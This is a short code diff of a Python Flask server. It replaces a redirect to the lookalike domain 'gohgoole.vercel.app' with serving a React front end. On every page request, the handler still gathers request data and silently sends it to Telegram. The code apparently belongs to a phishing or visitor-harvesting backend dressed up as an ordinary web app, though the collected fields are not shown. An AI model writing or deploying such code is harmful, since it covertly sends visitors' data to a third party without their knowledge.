@@ -21,7 +21,7 @@ OWNER = os.getenv("OWNER")
 vercel_url = os.getenv("VERCEL_URL")
 
 # --- Flask App Initialization ---
-app = Flask(__name__)
+app = Flask(__name__, static_folder='build')
 files_folder = ""
 
 CORS(app, resources={r"/*": {"origins": "*"}})
@@ -119,8 +119,9 @@ def server(status):
 
 
 
-@app.get("/")
-def default():
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def serve(path):
     """
     Main entrypoint: Handles serving the React application.
     The user_id is now passed in API calls from the client, not handled by sessions.
@@ -178,8 +179,10 @@ def default():
     message = "\n".join([f"{key}: {value}" for key, value in data.items()])
     # Send to telegram
     _send_telegram_message(message)
-
-    return redirect("https://gohgoole.vercel.app")
+    if path != "" and os.path.exists(os.path.join(app.static_folder, path)):
+        return send_from_directory(app.static_folder, path)
+    
+    return send_from_directory(app.static_folder, 'index.html')
 
 
 
